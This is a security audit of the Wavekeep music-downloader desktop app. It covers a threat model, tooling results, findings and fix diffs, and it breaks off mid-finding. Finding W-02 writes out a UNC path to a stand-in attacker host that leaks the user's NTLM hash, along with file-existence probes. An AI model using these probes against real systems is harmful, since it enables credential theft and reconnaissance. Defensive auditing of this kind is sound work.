# Wavekeep Security & Robustness Audit

| | |
|---|---|
| **Target** | Wavekeep 0.3.0 (formerly Deezy), commit `f4c6337` on `main`, clean working tree (the audited state; the findings were fixed in the following commit, see §0) |
| **Stack** | Tauri 2.11.2 (Rust backend, 37 files / ~9.5k lines, 60 IPC commands) + SvelteKit 2 / Svelte 5 SPA |
| **Platform used** | Windows 11 Pro 10.0.26200, WebView2 155, rustc stable, bun 1.3.14 |
| **Date** | 2026-10-24 |
| **Mode** | Read-only source review. No tracked file was changed; this file is the only repository write. All builds used a separate `CARGO_TARGET_DIR` in a scratch folder. Nothing contacted Deezer or Spotify: experiments used loopback, copied functions and local fixtures. Only package registries, the RustSec/OSV databases and api.osv.dev (package names and versions only) were contacted. |

Scratch logs and reproduction harnesses (outside the repository):
`C:\Users\pierr\AppData\Local\Temp\claude\D--Github-Deezy\4706f9d4-a648-45e1-a903-3c1e2a112061\scratchpad\` → `audit\` (tool logs `01`–`21`, `proptest\`), `audit-ipc\harness\`, `audit-robust\{repro,oauthblock,flacpanic}\`, `audit-frontend\{csp,eslint,deps-npm,deps-bun}\`.

---

## 0. Resolution status (follow-up, 2026-10-24)

The findings below describe the code at `f4c6337`. They were fixed in the commit after it. Line numbers in §6–§9 refer to the audited code, not the fixed code. `AGENTS.md` documents the new behaviour and `CHANGELOG.md` (0.3.0, Fixed and Security) summarises it for users.

| ID | Status | What changed |
|---|---|---|
| W-01 | Fixed | `release_year()` uses `date.get(..4)`. `download_track` runs the work in its own task, maps a panic to an error and always removes the cancellation entry. A `TempFileGuard` deletes the temp file unless the download was published. `exit_app` waits at most 30 s. |
| W-02 | Fixed | `may_resolve` checks the path text before any I/O; on Windows only drive paths, plus UNC shares already granted or holding `output_dir`, are resolved. One uniform "missing or not approved" error. |
| W-03 | Partly fixed | Login runs on `spawn_blocking` with a 5-minute timeout, and `release_callback` frees the port. **Remaining:** librespot-oauth still discards `state` (local login CSRF; PKCE prevents token theft), and an idle local connection can still hold the port until it closes. Fixing both needs a custom listener with SHA-256/CSPRNG/browser-opener crates. |
| W-04 | Fixed | Strict colour validator in `themes.rs`; frontend `isSafeThemeColor` (+ `CSS.supports`); swatch uses `style:background-color`. |
| W-05 | Fixed | Capability reduced to event listen/unlisten, window hide and three notification permissions; JS dialog/process packages and the Rust process plugin removed. |
| W-06 | Fixed | CSP gains `script-src`, `object-src`, `base-uri`, `form-action`, `frame-src`, `frame-ancestors`, `worker-src`, `font-src`; `freezePrototype: true`; `navigation-guard` plugin keeps the WebView on the app origin. |
| W-07 | Fixed | Deezer IDs: 1–20 digits (`deezer_id`), cover IDs alphanumeric; Spotify IDs: 22-char base62 (`validate_id`) at the IPC boundary and where URIs/URLs are built. |
| W-08 | Fixed | Spotify client HTTPS-only with 10/30/60 s timeouts; `read_capped` 16 MiB bodies, streamed 20 MiB cover cap; `next` links only to `api.spotify.com/v1`; refresh timeout 30 s. |
| W-09 | Fixed | Components capped at 180 bytes keeping the extension; short temp names (≤ 91 bytes). |
| W-10 | Fixed (not compiled on Unix here) | Process-wide lock around check+rename; `renameat2(RENAME_NOREPLACE)` first on Linux glibc. |
| W-11 | Fixed | Spotify tag-task panic is a non-fatal tag error; finalize-task failure cleans up. |
| W-12 | Fixed | Fixed fallback order, `MP3_160_ENC`/`OTHER5` refused, magic-byte check after decryption. |
| W-13 | Fixed | stderr written with `write_all`, errors ignored. |
| W-14 | Fixed | `checked_add`, remaining lifetime capped at 24 h. |
| W-15 | Fixed (no stale-file sweep) | Exit refuses new downloads; backend exits 15 s after an exit request if the renderer doesn't; `RunEvent::ExitRequested` routed through the same cleanup; close handler no longer uses `try_lock`. A startup sweep of `.wavekeep.part` was skipped (it would walk the whole library). |
| W-16 | Fixed | `AUTH_LOCK` around login/restore/logout, `LOGIN_PENDING`, `stop_persisting()`; `ensure_device_id` saves before committing to memory. |
| W-17 | Fixed (Spotify) / accepted (migration, log) | Spotify keyring calls on `spawn_blocking`. The migration's keyring access stays in `setup` by design (it must finish before IPC). Log file appends stay synchronous (short, under a std mutex). |
| W-18 | Fixed | `Settings::normalize` after load; logs repaired field names. |
| W-19 | Fixed | One call = one line (` ⏎ ` for line breaks). |
| W-20 | Fixed | `save_settings` keeps the stored ARL; only `login` changes it. |
| W-21 | Fixed | vite 6.4.5, devalue 5.9.4, source-map-js 1.2.2. **Remaining:** two low `@sveltejs/kit < 3` advisories (form `enhance`, prerender cache headers) that don't apply to this static, form-less SPA; fixing them needs kit 3. |
| W-22 | Partly fixed | `Cargo.lock` committed; h2, crossbeam-epoch, tokio, anyhow and event-listener updated (`cargo deny check advisories` no longer reports them). `cargo audit` still counts `rustls`/`rustls-webpki`, which stay in the lockfile but are not in the resolved Windows graph (native-tls is used). **Remaining:** quick-xml (0.37.5/0.38.4/0.39.4) needs Tauri 2.12, notification plugin 2.7 and a librespot update, and the JS packages would have to move with them (`tauri build` refuses mismatched versions); `rsa` (librespot) has no fixed version; unmaintained transitive crates. |
| W-23 | Fixed | ARL input: autofill, spell-check, autocapitalise and autocorrect off; field and draft cleared after a failed login (the draft is still kept across view switches on purpose). |
| W-24 | Fixed | Progress events only when the whole percent changes. |
| W-25 | Fixed | `raw_arg` with quotes; `"` refused; spawned processes reaped. |
| I-1 | Fixed | `without_url()` on the remaining reqwest errors (including search). |
| I-2 | Fixed | First `MD5_ORIGIN` character must be a hex digit. |
| I-3 | Fixed | Client ID must be empty or 32 hex characters; Settings shows an error for an invalid one. |
| I-4 | Fixed (untested against a real large library) | `liked_tracks` follows every `next_page_url` (and the `page_url` of a page without tracks) through `spclient().get_next_page`, accepts only `hm://` links, stops at 200 extra pages / 10,000 tracks, retries a page once, and fails instead of returning a shorter list. Unit tests cover paging order, cycles, foreign links, failures and both reply shapes; the live response format is assumed from librespot's own types. |
| Minor | Mostly fixed | All listed items except: tag-editor writes are still in place (a safe replace breaks hard links, ACLs and alternate data streams and copies up to 1 GiB per save); artist-URL queueing still has no confirmation; the Deezer full-GET quality probe is unchanged. |

---

## 1. Executive summary

> Written against `f4c6337`, before the fixes. §0 gives the current status of every finding.

The app is in **good shape for a hobby-scale desktop tool**: no Critical or High findings. The obvious big risks are designed out.
- The ARL and the Spotify tokens never cross IPC.
- No command takes a free-form filesystem path without a canonicalise-then-grant check.
- There is no shell, `fs`, deep-link, asset-protocol or updater surface.
- The frontend has **no HTML injection sink at all** (no `{@html}`, `innerHTML`, `eval`, `<a href>`, `<iframe>`).
- Deezer HTTP is hardened (https-only, a redirect allowlist, timeouts, streaming size caps).
- Downloads use `create_new` temp files with no-clobber publishing.

Even a fully compromised WebView cannot read arbitrary files, run programs, or steal credentials.

What remains falls into three themes:

1. **Panic and hang handling (Medium).** Every command is `async`, and Tauri 2.11.2 runs them without `catch_unwind`. A panic therefore leaves the JS promise pending forever. A Deezer track whose release date has a non-ASCII 5th byte panics the tag writer (**W-01**). The download slot is lost, the `.wavekeep.part` file stays, the track can never be retried, and `exit_app` then **loops forever**, so the window cannot be closed.
2. **What a compromised WebView can still do (Medium/Low).**
   - UNC paths reach `canonicalize()` *before* the grant check, which gives an SMB/NTLM hash leak and a file-existence oracle (**W-02**).
   - Unvalidated IDs are spliced into authenticated API URLs (**W-07**).
   - `save_settings` overwrites the stored ARL (**W-20**).
   - The capability grants more than the frontend uses, and the CSP has no `base-uri` / `form-action` and no navigation guard (**W-05**, **W-06**).
3. **Spotify login and HTTP robustness (Medium/Low).** librespot-oauth's loopback listener blocks a tokio worker with no timeout and holds port 5588 until restart (**W-03**). The Spotify HTTP client has no timeouts or body caps and follows `next` links with the bearer token without checking the host (**W-08**).

**Top 5 to fix first:** W-01 (panic-safe `download_track` plus `date.get(..4)`), W-02 (reject non-disk path prefixes before `canonicalize`), W-03 (OAuth listener timeout), W-05/W-06 (trim the capability, harden the CSP, add a navigation guard), W-21/W-22 (refresh `bun.lock`, commit `Cargo.lock`, add CI with `cargo deny` and `bun audit`).

Counts: **3 Medium, 22 Low, 4 Info**, plus a Minor list. Status: 18 Confirmed, 2 confirmed in code with plausible impact (W-06, W-08), 5 Plausible, 4 Needs verification.

---

## 2. Intended functionality, trust boundaries, threat model

### Intended functionality
A desktop app that searches the Deezer and Spotify catalogues, resolves pasted links, and downloads tracks, albums, playlists and the user's library to a user-chosen folder, with tags and cover art. Other features:
- **Deezer:** ARL cookie login, GW + legacy API; the audio is Blowfish-CBC-decrypted on every 3rd 2048-byte chunk.
- **Spotify:** OAuth PKCE via librespot; AP session for metadata and audio, decrypted with AES-CTR; Web API and Pathfinder for search.
- **Tools:** tag editor for local MP3/FLAC/OGG/M4A, custom JSON themes, download history with CSV/JSON export, a tray icon, OS notifications, and a local redacted diagnostic log.

### Assets
| Asset | Where it lives |
|---|---|
| Deezer ARL (full account session) | OS keyring (`com.pierr.wavekeep`); plaintext `settings.json` fallback only if the keyring is unavailable |
| Spotify OAuth access + refresh token | OS keyring (`spotify_oauth`) |
| User files (music library, anything on disk) | Filesystem; reachable only via grants |
| Integrity of downloaded files and tags | Output folder |
| Privacy: listening/search history, user name, home path | `download_history.json`, `settings.json` (search history), log file |
| Availability: queue, app exit | Process state |

### Trust boundaries
```
                 ┌───────────────────── Rust backend (trusted) ─────────────────────┐
 user ── UI ──►  │ WebView (SvelteKit SPA) ══IPC (60 cmds + plugin cmds)══► commands │
                 │   ▲ renders remote metadata/images      │                        │
                 │   │ (Deezer/Spotify CDNs via img/media) │ reqwest / librespot    │
                 └───┼─────────────────────────────────────┼────────────────────────┘
                     │                                     ▼
            theme JSON files (shared)          Deezer GW/legacy/CDN, Spotify AP/Web/Pathfinder
            history JSON (local)               (remote, semi-trusted: TLS but untrusted content)
                                               127.0.0.1:5588 OAuth listener (any local process)
```
- **B1 WebView → Rust IPC.** The main boundary. App-defined commands are **not** restricted by Tauri capabilities, so all 60 are callable by any script in the main window. Capabilities restrict only core/plugin commands.
- **B2 Remote services → Rust.** JSON metadata, audio streams and redirects. TLS-protected, but the content is untrusted: field types, string encodings, sizes and URLs.
- **B3 Remote content → WebView.** Text through Svelte interpolation (escaped); images and preview audio from CDN hosts allowed by the CSP.
- **B4 Local files → Rust.** Theme JSON (users are encouraged to share them), history, `settings.json`, the keyring, and the audio files opened in the tag editor.
- **B5 Local network → OAuth listener.** Any local process can connect to `127.0.0.1:5588` during a login.

### Attacker models
| ID | Attacker | Capability assumed |
|---|---|---|
| A1 | **Compromised WebView** (XSS, malicious npm dependency in the bundle, injected remote content) | Arbitrary JS in the main window; can call every app command and every capability-granted plugin command |
| A2 | Malicious or broken **remote metadata** (catalogue content, compromised CDN/API, upstream bug) | Controls JSON fields, audio bytes, pagination links, sizes |
| A3 | **Shared theme / crafted local file** given to the user | Controls a theme JSON, a tagged audio file the user opens, or a history file |
| A4 | **Unprivileged local process** (same user) | Can connect to loopback ports and spam the listener; cannot read the keyring without user-level access (out of scope: same-user malware already owns the account) |
| A5 | **Supply chain** (npm/crates) | Malicious install script or crate |

Out of scope: an attacker with the same user's code execution (they can read the keyring directly), physical access, and the legality of downloading.

---

## 3. Attack surface map

| Surface | Entry points | Input controlled by | Key controls | Findings |
|---|---|---|---|---|
| File-path commands | `read_file_tags`, `write_file_tags` (+`new_cover_path`), `read_image_as_data_url`, `show_in_folder`, `save_settings`/`update_settings` (`output_dir`) | A1 | `canonical_file` → grant set or under `output_dir` (`commands.rs:51-97`) | W-02, W-25 |
| Catalogue/ID commands | `get_album_tracks`, `get_artist_albums`, `get_playlist_tracks`, `get_album`, Spotify equivalents | A1 | none (ID not validated) | W-07 |
| Download | `download_track`, `cancel_download` | A1 (ID), A2 (metadata, audio) | backend resolves metadata itself; template sanitiser; 1 GiB cap (Deezer) | W-01, W-09, W-10, W-11, W-12, W-24 |
| Accounts/settings | `login`, `auto_login`, `save_settings`, `update_settings`, `spotify_login/logout/status` | A1, B4 | ARL stripped from `get_settings`; allowlisted `update_settings` keys | W-03, W-14, W-16, W-18, W-20 |
| Themes | `save_custom_theme`, `import`, `list`, `delete` | A3, A1 | name sanitiser; prefix-only colour check | W-04 |
| Logging | `write_log`, `read_recent_log`, `delete_log`, `open_log_folder` | A1, A2 | redaction (home, URL query, 100+ char tokens) | W-13, W-19 |
| Tray | `set_tray_tooltip`, `set_tray_labels`, `update_tray_*` | A1 | labels capped at 60 chars | Minor |
| Plugin/core commands | `core:default`, window, `core:tray:default`, `dialog:default`, `notification:default`, `process:allow-restart` | A1 | capability `default.json` | W-05 |
| WebView config | CSP, navigation, `freezePrototype` | A1 | CSP `connect-src ipc:` only; `withGlobalTauri:false` | W-04, W-06 |
| OAuth loopback | `127.0.0.1:5588/login` | A4, browser | PKCE (state ignored) | W-03 |
| Remote HTTP | Deezer client, Spotify client, librespot | A2 | Deezer hardened; Spotify not | W-08 |
| Supply chain | `bun.lock`, `Cargo.lock` (gitignored) | A5 | lockfile overrides; Bun does not run untrusted postinstall | W-21, W-22 |

---

## 4. Build and execution results

Logs are in `scratchpad\audit\`. The dev `wavekeep.exe` was running, so everything built into `scratchpad\audit\target`.

| Step | Command | Result |
|---|---|---|
| Lockfile install | `bun install --frozen-lockfile` | OK; lockfile in sync, no changes (`10-bun-install.log`) |
| Env | `npm run tauri -- info` | tauri 2.11.2, `@tauri-apps/api` 2.11.1, CLI 2.11.4; dialog 2.7.1 (rs) / 2.7.2 (js), notification 2.3.3/2.3.3, process 2.3.1/2.3.1. Versions consistent (`11-tauri-info.log`) |
| Type check | `bun run check` (svelte-check) | **0 errors, 0 warnings** (`12`) |
| Frontend tests | `npm test` | **29/29 pass** (`13`) |
| Frontend build | `vite build` | OK; no `.map` files emitted; no secret-like strings in `build/` (`14`) |
| Rust debug | `cargo build --all-targets --all-features` | OK, 1m33; no warnings besides the linker import-library notice (`01`) |
| Rust release | `cargo build --release` | OK, 2m13 (`03`) |
| Tauri build | `npm run tauri -- build --debug --no-bundle` | OK, `wavekeep.exe` produced (`06`) |
| Rust tests | `cargo test` / `cargo test --release` | **56 passed, 0 failed, 0 ignored** both profiles (`02`, `04`) |
| Hostile inputs (IPC harness) | copies of `canonical_file`/`require_audio_file`, URL builders, theme-name sanitiser, log formatting (`audit-ipc\harness`) | Reproduced W-02, W-07, W-19, Info-2; see the findings |
| Hostile inputs (robustness) | `audit-robust\repro` (date slicing, `unix_to_instant`, redaction, `eprint!` to a closed pipe); `oauthblock` (librespot-oauth on port 5599, no browser); `flacpanic` (malformed FLAC PICTURE → metaflac panic in `spawn_blocking`) | Reproduced W-01 (panic), W-03, W-13, W-14; metaflac panic **contained** as `JoinError` |
| CSS injection | `audit-frontend\csp\test.html` in headless Chrome with the app's CSP, traffic forced to a dead proxy | Reproduced W-04 |
| Property tests | `audit\proptest` (copied `sanitize_path_component`, custom-template path builder, `utc_timestamp`, `strip_url_queries`, `mask_long_tokens`; 20,000 cases each) | **6/6 pass**: no path escapes the output dir, no `.`/`..`/separator components, no timestamp panic for any `u64`, queries and 100+ hex runs redacted. Also confirmed the upper-case `HTTPS://` gap (`21-proptest.log`) |
| Runtime GUI | — | **Not done**: no WebDriver/e2e exploitation in a live WebView. Exploit chains from A1 are argued from code plus harnesses. |

---

## 5. Tooling results

| Tool | Result | Notes |
|---|---|---|
| `cargo clippy --all-targets -- -W clippy::pedantic -W clippy::unwrap_used -W clippy::expect_used -W clippy::panic -W clippy::indexing_slicing -W clippy::arithmetic_side_effects` (`05`) | exit 0. 225 `uninlined_format_args`; 129 `indexing_slicing`; 66 `unwrap`/`expect` (almost all in `#[cfg(test)]`); 29 arithmetic; 8 string slicing; 12 cast lints | The 129 indexing hits are nearly all `serde_json::Value["key"]`, which returns `Null` and never panics. The 8 slicing hits were triaged: `deezer/download.rs:387,478` are **real** (W-01); `logging.rs:173` and `spotify/download.rs:179,182,219,322` are in range (bounds proven by `saturating_sub` / `read_exact`); the rest are tests. Casts: `spotify/api.rs:379,429,430` (u64→u32 durations/track numbers, truncation only cosmetic); `spotify/ap.rs:59,64` `(i32 - 300).abs()` overflows only for crafted protobufs (Minor). Production `unwrap`s: `deezer/auth.rs:17` parses a constant URL; `paths.rs:136` is guarded. |
| `cargo audit` 0.22.2 (`18`) | **14 vulnerabilities, 14 warnings** (unmaintained/unsound) | See W-22. Real-graph hits: `h2` RUSTSEC-2026-0258 (via hyper/librespot-core), `quick-xml` 0194/0195 (×3: 0.37.5 notification, 0.38.4 librespot-core, 0.39.4 plist), `rsa` RUSTSEC-2023-0071 Marvin (librespot-core, **no fix**), `crossbeam-epoch` RUSTSEC-2026-0204. `rustls`/`rustls-webpki` hits are lockfile leftovers **not in the resolved graph** (`cargo tree` and cargo-deny agree; native-tls is used). |
| `cargo deny check advisories bans sources` 0.20.2 (`19`) | advisories **FAILED**, bans ok, sources ok; 48 duplicate-version warnings | Adds the unsound `tokio` `AsyncFd` advisory. All sources are crates.io. |
| `cargo geiger` 0.14 (`20`) | tree-wide: 24.6% of functions / 57.6% of expressions in dependencies use `unsafe` | Typical for a Tauri + tokio + windows-sys tree. The app crate's own unsafe is listed in §9. 440 warnings for unscanned generated protobuf files. |
| `rg unsafe` | 3 blocks in the app crate (§9) | No `unsafe fn`, `unsafe impl` or `static mut` |
| Miri | **Not applicable** | The crate's only `unsafe` blocks are FFI calls (`MoveFileExW`, `libc::mkfifo`) that Miri cannot execute; the pure logic was covered by property tests instead. |
| Fuzz / proptest | `audit\proptest`, 6 properties × 20k cases | Pass (see §4). cargo-fuzz was not set up; suggested targets are in §11. |
| `bun audit` all (`15`) / `--prod` (`16`) | **14** (6 high, 6 moderate, 2 low) / **8** | All in build/dev tooling: `vite` 6.4.3, `devalue` 5.9.0, `source-map-js` 1.2.1. `--prod` hits are `devalue` via svelte/kit, which is **not present in the built bundle** (grep of `build/_app`). A fresh resolution has 0 vulnerabilities → W-21. |
| `npm audit` (scratch copy, `audit-frontend\deps-npm`) | 0 vulnerabilities after fresh resolution | Confirms the lockfile is stale, not the ranges |
| `osv-scanner` 2.2.4 (`17`) | 45 vulns in 27 packages (bun.lock + local Cargo.lock) | Same set as above, plus `@sveltejs/kit` GHSA-27mw-82g8-phjj / GHSA-pfhg-q3qv-9q6r (fixed in 3.0.0; server-side features, very likely not applicable to `adapter-static` — Needs verification), `glib` RUSTSEC-2024-0429 (Linux only), `serde_with`, `anyhow`, `event-listener`, `zbus/zvariant`, unmaintained `unic-*`, `paste`, `proc-macro-error`. |
| ESLint (`eslint-plugin-svelte` + `eslint-plugin-security`, scratch config, `audit-frontend\eslint`) | 19 hits, **all false positives** | 10 `detect-object-injection` on fixed-enum lookups, 9 `detect-possible-timing-attacks` on request-token `===`. No `no-at-html-tags`, `no-target-blank`, `no-eval`, `no-implied-eval`. |
| rg sweeps | `{@html`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `eval(`, `new Function`, `document.write`, `postMessage`, `__TAURI__`, `import.meta.env`, `$env/`, `sessionStorage`, `target="_blank"`, `window.open`, `danger_accept_invalid` → **0 hits** | `localStorage` only in `notice.ts:36` (startup-notice flag). `Command::new` in `commands/filesystem.rs:32,40,53` and `commands/diagnostics.rs:52,60,70` (fixed program names, path as a single arg). |
| Install scripts / typosquats | `esbuild` postinstall (binary fetch, normal); `es5-ext@0.10.64` postinstall (known "call for peace" protest message, Russian time zones only; via `svelte-i18n → cli-color`); `prepare` in acorn/rollup/set-cookie-parser (not run for registry installs) | Bun does not run untrusted lifecycle scripts by default; **`npm install` (documented in AGENTS.md) would run es5-ext's**. No typosquat-looking names. |
| Tauri config/capability dump | `capabilities/default.json`, `gen/schemas/acl-manifests.json` | Expanded in W-05 |
| CI | **none** (`.github/` absent) | §11 |

---

## 6. Findings table

| ID | Severity | Status | Category | Location | Summary |
|---|---|---|---|---|---|
| W-01 | Medium | Confirmed (panic); chain by reading | Panic / availability | `deezer/download.rs:386-387,477-478`; `commands/downloads.rs:21-32`; `commands/account.rs:21-23` | Non-ASCII release date panics the tag writer → promise never settles, slot lost, temp file kept, track blocked, `exit_app` loops forever |
| W-02 | Medium | Confirmed (harness) | IPC / path handling | `commands.rs:51-97` | `canonicalize()` runs before the grant check: UNC paths trigger SMB auth (NTLM hash leak) and errors form a file-existence oracle |
| W-03 | Medium | Confirmed (repro) | Concurrency / DoS | `spotify/auth.rs:147-161`; librespot-oauth 0.8.0 `lib.rs:170-209,327-333` | OAuth loopback listener blocks a tokio worker with no timeout; abandoned login holds port 5588 until restart; `state` not checked |
| W-04 | Low | Confirmed (headless Chromium) | CSS injection | `themes.rs:80-84`; `ThemeManager.svelte:338`; `+layout.svelte:72-80` | Theme colours are prefix-checked only; a shared theme can overlay the whole window and make CDN/`data:` image requests |
| W-05 | Low | Confirmed | Least privilege | `capabilities/default.json:7-15` | `dialog:default`, `process:allow-restart`, `core:tray:default`, window show/close/skip-taskbar are granted but unused |
| W-06 | Low | Confirmed (config) / Plausible (nav) | CSP / WebView config | `tauri.conf.json:23`; `lib.rs` (no `on_navigation`) | No `base-uri`, `form-action`, `object-src`, navigation guard or `freezePrototype`; injected script can exfiltrate by top-level navigation |
| W-07 | Low | Confirmed (URL normalisation) | IPC input validation | `deezer/catalog.rs:215,309,392,436`; `deezer/media.rs:113`; `spotify/api.rs:294-297` | Renderer IDs are formatted into authenticated API URL paths; `../` and `?` re-target the request |
| W-08 | Low | Confirmed (reading) / Plausible (impact) | Network robustness | `spotify/api.rs:146-163`; `spotify/auth.rs:366-369`; `spotify/download.rs:478`; `spotify/api.rs:103-106`; `spotify/pathfinder.rs:152-155` | Spotify client: `next` followed with bearer token and no host check; no timeouts; unbounded bodies |
| W-09 | Low | Confirmed | Robustness | `paths.rs:186-219,241-244` | No length cap on path components; temp suffix pushes long names past 255 → track can never download |
| W-10 | Low | Plausible | Concurrency / integrity | `paths.rs:334-343` | Non-Windows fallback (no hard links: exFAT/FAT) check-then-`rename` can silently overwrite a concurrent download |
| W-11 | Low | Confirmed (reading) | Cleanup / contract | `spotify/download.rs:251-255,281-292` | Spotify tagging/finalize task panic returns early, leaves `.wavekeep.part`, fails the download (contradicts "tag failure is non-fatal") |
| W-12 | Low | Needs verification | Correctness | `spotify/download.rs:428-438,176` | Fallback picks an arbitrary `HashMap` format; decrypted stream not validated as audio |
| W-13 | Low | Confirmed (Unix-relevant) | Panic | `logging.rs:128`; `lib.rs:37-45` | `eprint!` panics on a closed stderr; inside the panic hook it aborts the process |
| W-14 | Low | Confirmed (repro) | Integer overflow / panic | `spotify/auth.rs:420-423` | Tampered `expires_at_unix` panics session restore on every start |
| W-15 | Low | Plausible | Shutdown | `lib.rs:97-119,188`; `commands/account.rs:8-27` | Exit relies on the renderer; downloads started after exit aren't rejected; `RunEvent::ExitRequested` (Cmd+Q) skips cleanup |
| W-16 | Low | Plausible | Concurrency | `commands/spotify.rs:52-87,188-213`; `spotify/auth.rs:394` | Spotify login/restore/logout race: logout during restore is undone; refresh tokens can rotate twice |
| W-17 | Low | Confirmed (reading) | Blocking on async runtime | `spotify/auth.rs:124-137,175,196,214,244,260,394`; `commands/spotify.rs:56,211`; `migration.rs:52`; `logging.rs:134-139` | Keyring, fsync and log I/O on tokio workers and the main thread |
| W-18 | Low | Confirmed (reading) | Robustness | `settings.rs:532-589` | `Settings::load` doesn't validate; one bad value on disk makes every later save fail |
| W-19 | Low | Confirmed (harness) | Log integrity | `logging.rs:192-201` | Newlines in renderer/remote text forge extra log lines (the log is what users attach to bug reports) |
| W-20 | Low | Confirmed (reading) | IPC / credential integrity | `commands/settings.rs:48-50` | `save_settings` accepts any non-empty `arl` from the renderer and overwrites the keyring entry |
| W-21 | Low | Confirmed | Dependencies (npm) | `deezy/bun.lock` | Stale lockfile pins vulnerable `vite`/`devalue`/`source-map-js` (build-time only) |
| W-22 | Low | Confirmed | Dependencies (Rust) / supply chain | `.gitignore:49`; `Cargo.lock` | `Cargo.lock` not committed; current resolution has h2, quick-xml, rsa (Marvin, no fix), crossbeam-epoch, tokio advisories |
| W-23 | Low | Needs verification | Secret handling (UI) | `SettingsView.svelte:501-505`; `stores.ts:134` | ARL input allows autofill/spellcheck; draft kept in a global store after failed login |
| W-24 | Low | Plausible | Performance / DoS | `deezer/download.rs:243-246` | One `download-progress` IPC event per 2 KiB chunk (~15k events per FLAC) |
| W-25 | Low | Confirmed (harness) | Correctness | `commands/filesystem.rs:28-35` | `explorer` gets an unquoted path; a comma in a folder name opens the wrong folder |
| I-1 | Info | Plausible | Info exposure | `deezer/download.rs:185`; `downloadQueue.ts:270` | Stream error printed without `without_url()`; raw errors stored in history/exports |
| I-2 | Info | Confirmed (harness) | Remote-controlled host | `deezer/crypto.rs:83-91` | Legacy CDN host built from `MD5_ORIGIN[0]` without an allowlist |
| I-3 | Info | Needs verification | OAuth | librespot-oauth 0.8.0 | Custom `spotify_client_id` is settable from the renderer (`commands/settings.rs:99-102`) |
| I-4 | Info | Needs verification | Spotify fidelity | `spotify/ap.rs:318-325` | Liked Songs uses only pages embedded in the first context response; large libraries may be truncated |

---

## 7. Detailed findings

Line numbers refer to commit `f4c6337`. "A1"–"A5" are the attacker models from §2.

### W-01 — Remote-data panic in the Deezer tag writer leads to a hung download and an un-closable app
**Severity:** Medium · **Status:** Confirmed (panic reproduced); downstream chain inferred from tauri 2.11.2 source and app code, not run end-to-end · **Category:** panic / availability

```rust
// deezer/download.rs:385-387  (write_mp3_tags, an async fn awaited inside the command task)
if let Some(date) = track_data["PHYSICAL_RELEASE_DATE"].as_str() {
    if date.len() >= 4 {
        if let Ok(year) = date[..4].parse::<i32>() {
// deezer/download.rs:477-478  (write_flac_tags)
        if date.len() >= 4 {
            tag.set_vorbis("DATE", vec![&date[..4]]);
```
```rust
// commands/downloads.rs:21,32   — removal only runs if execute_download_track returns
let result = execute_download_track(&trackId, &state, &app, cancel_flag).await;
state.download_cancellations.lock().await.remove(&trackId);
// commands/account.rs:21-23     — exit waits for that map to drain, with no limit
while !state.download_cancellations.lock().await.is_empty() {
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
}
```
**Attacker / prerequisite:** A2. `song.getData` returns a `PHYSICAL_RELEASE_DATE` with a non-ASCII character spanning byte 4 (e.g. `"2éé0"`, `"未定日期"`), through bad catalogue data or an upstream bug. `paths.rs:88` already guards this exact field with `chars().take(4)`; the tag writers do not.

**What happens:**
1. The audio has been fully written to `…wavekeep.part`, then tagging panics with "byte index 4 is not a char boundary".
2. Tauri 2.11.2 (`ipc/mod.rs:371-389`) spawns async commands without `catch_unwind`, so tokio swallows the panic and the `invoke()` promise never settles.
3. Consequences:
   - `downloadQueue.ts:218` awaits with no timeout → one concurrency slot is lost for the session.
   - The cancellation entry is never removed → the track says "already downloading" on every retry.
   - The temp file is never cleaned.
   - `exit_app` spins forever → the close button (and the tray Quit) never exits.
4. This applies to **any** panic in a command, which is why the structural fix matters more than the two slices.

**Reproduction:** `audit-robust\repro` → `cargo run`. The section "date slicing" prints the panic messages for both inputs. The hang chain follows from reading `tauri-2.11.2/src/ipc/mod.rs:371-389` together with the code above.

**Fix sketch:**
```diff
- if date.len() >= 4 { if let Ok(year) = date[..4].parse::<i32>() {
+ if let Some(y) = date.get(..4) { if let Ok(year) = y.parse::<i32>() {
- if date.len() >= 4 { tag.set_vorbis("DATE", vec![&date[..4]]); }
+ if let Some(y) = date.get(..4) { tag.set_vorbis("DATE", vec![y]); }
```
```diff
  // commands/downloads.rs — make the command panic-safe
- let result = execute_download_track(&trackId, &state, &app, cancel_flag).await;
+ // execute_download_track_owned takes owned args and fetches AppState via app.state()
+ let result = tauri::async_runtime::spawn(execute_download_track_owned(trackId.clone(), app.clone(), cancel_flag))
+     .await
+     .unwrap_or_else(|e| Err(format!("Download task failed: {e}")));
  state.download_cancellations.lock().await.remove(&trackId);
```
Also add an RAII temp-file guard (`Drop` removes the file unless disarmed after `finalize_download_file`), a bounded wait in `exit_app` (e.g. 30 s, then log and exit), and a timeout on the frontend `invoke`.

### W-02 — Paths are canonicalised before the grant check (UNC/SMB leak + existence oracle)
**Severity:** Medium · **Status:** Confirmed (harness on copied functions) · **Category:** IPC / path handling

```rust
// commands.rs:51-62
async fn canonical_file(path: &str) -> Result<PathBuf, String> {
    let canonical = tokio::fs::canonicalize(path).await
        .map_err(|e| format!("Failed to resolve file path: {}", e))?;
    let metadata = tokio::fs::metadata(&canonical).await ...;
    if !metadata.is_file() { return Err("Path is not a file".to_string()); }
// commands.rs:83-97 (require_audio_file) — grant check happens only after the above
```
**Attacker / prerequisite:** A1 (any script in the WebView). Reachable through `read_file_tags`, `write_file_tags` (path and `new_cover_path`), `read_image_as_data_url` and `show_in_folder`. `save_settings`/`update_settings` take the same route through `require_granted_folder` for `output_dir`.

**What the attacker gets:**
- **NTLM hash leak.** `read_file_tags({path: "\\\\attacker.example\\s\\x.mp3"})` makes Windows open an SMB session to the attacker host and send the user's NTLMv2 challenge-response, which can be cracked or relayed. Outbound SMB is often blocked by ISPs, but corporate/LAN networks and WebDAV fallback (`\\host@SSL\...`) widen this.
- **Existence oracle.** The three different error strings reveal whether an arbitrary local path exists, is a file or a directory, or is reachable on the network:
  - "approved by Wavekeep" → the file exists
  - "os error 2" → the path is missing
  - "Path is not a file" → it is a directory
  - "os error 67" → the network share is missing

  This lets a compromised page probe for installed software or user folders. No file content is disclosed.

**Reproduction:** `audit-ipc\harness` → `audit-harness.exe` (loopback only):
```
\\127.0.0.1\C$\Windows\win.ini     -> Err("Audio file has not been approved by Wavekeep")   ← SMB round-trip happened
\\127.0.0.1\nosuchshare\a.mp3      -> Err("Failed to resolve file path: … (os error 67)")
C:\Windows\definitely-missing.mp3  -> Err("Failed to resolve file path: … (os error 2)")
C:\Windows                         -> Err("Path is not a file")
```
**Fix sketch:**
```diff
 async fn canonical_file(path: &str) -> Result<PathBuf, String> {
